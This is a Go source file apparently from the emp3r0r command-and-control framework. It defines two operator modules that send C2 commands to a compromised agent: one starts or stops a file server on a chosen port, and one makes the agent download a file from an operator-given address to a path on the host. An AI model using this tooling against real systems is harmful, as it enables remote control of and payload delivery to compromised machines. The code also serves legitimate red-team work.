package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleFileServer() {
	switchOpt, ok := live.ActiveModule.Options["switch"]
	if !ok {
		logging.Errorf("Option 'switch' not found")
		return
	}
	server_switch := switchOpt.Val

	portOpt, ok := live.ActiveModule.Options["port"]
	if !ok {
		logging.Errorf("Option 'port' not found")
		return
	}
	cmd := fmt.Sprintf("%s --port %s --switch %s", def.C2CmdFileServer, portOpt.Val, server_switch)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Infof("File server (port %s) is now %s", portOpt.Val, server_switch)
}

func moduleDownloader() {
	requiredOptions := []string{"download_addr", "checksum", "path"}
	for _, opt := range requiredOptions {
		if _, ok := live.ActiveModule.Options[opt]; !ok {
			logging.Errorf("Option '%s' not found", opt)
			return
		}
	}

	download_addr := live.ActiveModule.Options["download_addr"].Val
	checksum := live.ActiveModule.Options["checksum"].Val
	path := live.ActiveModule.Options["path"].Val

	cmd := fmt.Sprintf("%s --download_addr %s --checksum %s --path %s", def.C2CmdFileDownloader, download_addr, checksum, path)
	err := CmdSender(cmd, "", live.ActiveAgent.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
